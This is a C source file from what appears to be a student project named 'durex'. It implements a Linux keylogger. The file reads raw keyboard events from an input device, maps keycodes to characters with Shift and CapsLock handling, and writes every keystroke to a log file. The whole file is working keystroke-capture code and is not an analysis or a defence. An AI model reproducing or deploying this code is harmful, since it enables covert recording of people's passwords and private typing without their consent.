/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   keylog_pressed.c                                   :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mdufaud <mdufaud@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/05/20 18:32:14 by mdufaud           #+#    #+#             */
/*   Updated: 2018/09/19 16:45:23 by mdufaud          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "durex.h"
#include <linux/input.h>

static const char	*key_names[] = {
	KEYLOG_UK, "<ESC>",
	"1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=",
	"<Backspace>", "<Tab>",
	"q", "w", "e", "r", "t", "y", "u", "i", "o", "p",
	"[", "]", "<Enter>", "<LCtrl>",
	"a", "s", "d", "f", "g", "h", "j", "k", "l", ";",
	"'", "`", "<LShift>",
	"\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/",
	"<RShift>",
	"<KP*>",
	"<LAlt>", " ", "<CapsLock>",
	"<F1>", "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>", "<F8>", "<F9>", "<F10>",
	"<NumLock>", "<ScrollLock>",
	"<KP7>", "<KP8>", "<KP9>",
	"<KP->",
	"<KP4>", "<KP5>", "<KP6>",
	"<KP+>",
	"<KP1>", "<KP2>", "<KP3>", "<KP0>",
	"<KP.>",
	KEYLOG_UK, KEYLOG_UK, KEYLOG_UK,
	"<F11>", "<F12>",
	KEYLOG_UK, KEYLOG_UK, KEYLOG_UK, KEYLOG_UK, KEYLOG_UK, KEYLOG_UK, KEYLOG_UK,
	"<KPEnter>", "<RCtrl>", "<KP/>", "<SysRq>", "<RAlt>", KEYLOG_UK,
	"<Home>", "<Up>", "<PageUp>", "<Left>", "<Right>", "<End>", "<Down>",
	"<PageDown>", "<Insert>", "<Delete>"
};

static const char	*shift_key_names[] = {
	KEYLOG_UK, "<ESC>",
	"!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+",
	"<Backspace>", "<Tab>",
	"Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P",
	"{", "}", "<Enter>", "<LCtrl>",
	"A", "S", "D", "F", "G", "H", "J", "K", "L", ":",
	"\"", "~", "<LShift>",
	"|", "Z", "X", "C", "V", "B", "N", "M", "<", ">", "?",
	"<RShift>",
	"<KP*>",
	"<LAlt>", " ", "<CapsLock>",
	"<F1>", "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>", "<F8>", "<F9>", "<F10>",
	"<NumLock>", "<ScrollLock>",
	"<KP7>", "<KP8>", "<KP9>",
	"<KP->",
	"<KP4>", "<KP5>", "<KP6>",
	"<KP+>",
	"<KP1>", "<KP2>", "<KP3>", "<KP0>",
	"<KP.>",
	KEYLOG_UK, KEYLOG_UK, KEYLOG_UK,
	"<F11>", "<F12>",
	KEYLOG_UK, KEYLOG_UK, KEYLOG_UK, KEYLOG_UK, KEYLOG_UK, KEYLOG_UK, KEYLOG_UK,
	"<KPEnter>", "<RCtrl>", "<KP/>", "<SysRq>", "<RAlt>", KEYLOG_UK,
	"<Home>", "<Up>", "<PageUp>", "<Left>", "<Right>", "<End>", "<Down>",
	"<PageDown>", "<Insert>", "<Delete>"
};

static char			is_shift(unsigned long long code)
{
	return (code == KEY_LEFTSHIFT || code == KEY_RIGHTSHIFT);
}

static const char	*get_key_name(t_ull code, t_keylog *kl)
{
	const char	**array;

	if (kl->shift_pressed != 0 || kl->capslock > 0)
		array = shift_key_names;
	else
		array = key_names;
	if (code < (unsigned long long)ft_tablen((char **)array))
		return (array[code]);
	return (NULL);
}

static const char	*parse_key(t_durex *durex, struct input_event *event)
{
	const char		*name;

	if (event->type == EV_KEY)
	{
		if (event->value == KEY_PRESS)
		{
			if (is_shift(event->code))
				durex->kl.shift_pressed++;
			if (event->code == KEY_CAPSLOCK)
				durex->kl.capslock = !durex->kl.capslock;
			name = get_key_name(event->code, &durex->kl);
			keylog_parse(&durex->kl, event->code, name);
			return (name);
		}
		else if (event->value == KEY_RELEASE)
		{
			if (is_shift(event->code))
				durex->kl.shift_pressed--;
		}
	}
	return (NULL);
}

void				keylog_pressed(t_durex *durex)
{
	int						ret;
	struct input_event		event;
	const char				*name;

	if ((ret = read(durex->kl.keyboard_device, &event,
		sizeof(struct input_event))) < 0)
	{
		log_info(durex, "Read error in keyboard device");
		keylog_stop(durex);
		return ;
	}
	if ((name = parse_key(durex, &event)))
	{
		if (event.code == KEY_ENTER)
			ft_putendl_fd(name, durex->kl.keylog_log);
		else
			ft_putstr_fd(name, durex->kl.keylog_log);
	}
}
